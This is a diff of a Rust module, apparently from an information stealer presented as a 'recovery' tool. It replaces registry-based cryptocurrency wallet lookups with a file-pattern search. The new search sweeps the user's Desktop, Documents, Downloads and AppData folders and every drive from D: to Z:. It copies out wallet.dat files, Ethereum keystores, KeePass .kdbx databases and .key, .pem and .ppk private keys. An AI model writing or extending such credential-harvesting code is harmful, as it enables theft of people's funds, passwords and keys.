@@ -7,11 +7,13 @@ use async_trait::async_trait;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::fs;
-use winreg::RegKey;
-use winreg::enums::HKEY_CURRENT_USER;
+use walkdir::WalkDir;
 
 pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
-    vec![Arc::new(CryptoWalletTask::new(ctx))]
+    vec![
+        Arc::new(CryptoWalletTask::new(ctx)),
+        Arc::new(WalletPatternSearchTask::new(ctx)),
+    ]
 }
 
 struct CryptoWalletTask {
@@ -85,20 +87,10 @@ fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
     specs.push(WalletSpec::new("Ethereum Keystore").dir(roaming.join("Ethereum").join("keystore")));
     specs.push(WalletSpec::new("Electrum Wallets").dir(roaming.join("Electrum").join("wallets")));
 
-    if let Some(dir) = registry_dir("Software\\Dash\\Dash-Qt", "strDataDir") {
-        specs.push(WalletSpec::new("Dash Data").file(dir.join("wallet.dat")));
-    }
-
-    specs.push(WalletSpec::new("Bytecoin").dir(roaming.join("bytecoin")));
-    if let Some(dir) = registry_dir("Software\\Bitcoin\\Bitcoin-Qt", "strDataDir") {
-        specs.push(WalletSpec::new("Bitcoin Core").file(dir.join("wallet.dat")));
-    }
-
     specs.push(
         WalletSpec::new("Atomic LevelDB")
             .dir(roaming.join("atomic").join("Local Storage").join("leveldb")),
     );
-    specs.push(WalletSpec::new("Armory").dir(roaming.join("Armory")));
     specs.push(WalletSpec::new("Exodus").file(roaming.join("Exodus").join("exodus.wallet")));
     specs.push(
         WalletSpec::new("Jaxx LevelDB").dir(
@@ -109,16 +101,6 @@ fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
         ),
     );
 
-    if let Some(dir) = registry_dir("Software\\Litecoin\\Litecoin-Qt", "strDataDir") {
-        specs.push(WalletSpec::new("Litecoin Core").file(dir.join("wallet.dat")));
-    }
-
-    if let Some(path) = registry_value("Software\\monero-project\\monero-core", "wallet_path") {
-        let normalized = PathBuf::from(path.replace('/', "\\"));
-        specs.push(WalletSpec::new("Monero Core").file(normalized));
-    }
-
-    specs.push(WalletSpec::new("Zcash").dir(roaming.join("Zcash")));
     specs.push(
         WalletSpec::new("Coinomi").dir(roaming.join("Coinomi").join("Coinomi").join("wallets")),
     );
@@ -131,20 +113,96 @@ fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
     specs
 }
 
-fn registry_dir(subkey: &str, value: &str) -> Option<PathBuf> {
-    RegKey::predef(HKEY_CURRENT_USER)
-        .open_subkey(subkey)
-        .ok()
-        .and_then(|key| key.get_value::<String, _>(value).ok())
-        .map(PathBuf::from)
+struct WalletPatternSearchTask {
+    user_roots: Vec<PathBuf>,
+    drive_roots: Vec<PathBuf>,
 }
 
-fn registry_value(subkey: &str, value: &str) -> Option<String> {
-    RegKey::predef(HKEY_CURRENT_USER)
-        .open_subkey(subkey)
-        .ok()
-        .and_then(|key| key.get_value::<String, _>(value).ok())
+impl WalletPatternSearchTask {
+    fn new(ctx: &RecoveryContext) -> Self {
+        let mut user_roots = vec![
+            ctx.home_dir.join("Desktop"),
+            ctx.home_dir.join("Documents"),
+            ctx.home_dir.join("Downloads"),
+            ctx.local_data_dir.clone(),
+            ctx.roaming_data_dir.clone(),
+        ];
+        user_roots.retain(|p| p.exists());
+
+        let mut drive_roots = Vec::new();
+        for b in b'D'..=b'Z' {
+            let drive = format!("{}:\\", b as char);
+            let path = PathBuf::from(&drive);
+            if path.exists() {
+                drive_roots.push(path);
+            }
+        }
+
+        Self {
+            user_roots,
+            drive_roots,
+        }
+    }
 }
+
+const TARGET_PATTERNS: &[&str] = &[
+    "wallet.dat",
+    "default_wallet",
+    "UTC--",
+    ".kdbx",
+    ".key",
+    ".pem",
+    ".ppk",
+];
+
+#[async_trait]
+impl RecoveryTask for WalletPatternSearchTask {
+    fn label(&self) -> String {
+        "Wallet Discovery".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Wallets
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let dest_root = wallet_output_dir(ctx, "Discovery").await?;
+
+        // Scan user directories with depth 5 (deeper scan for known user paths)
+        for root in &self.user_roots {
+            for entry in WalkDir::new(root)
+                .max_depth(5)
+                .into_iter()
+                .filter_map(Result::ok)
+                .filter(|e| e.file_type().is_file())
+            {
+                let name = entry.file_name().to_string_lossy();
+                if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
+                    copy_wallet_file("Discovery", entry.path(), &dest_root, &mut artifacts).await?;
+                }
+            }
+        }
+
+        // Scan other drives with depth 3 (shallow scan for USB/External)
+        for root in &self.drive_roots {
+            for entry in WalkDir::new(root)
+                .max_depth(3)
+                .into_iter()
+                .filter_map(Result::ok)
+                .filter(|e| e.file_type().is_file())
+            {
+                let name = entry.file_name().to_string_lossy();
+                if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
+                    copy_wallet_file("Discovery", entry.path(), &dest_root, &mut artifacts).await?;
+                }
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
 
 async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
     let folder = ctx
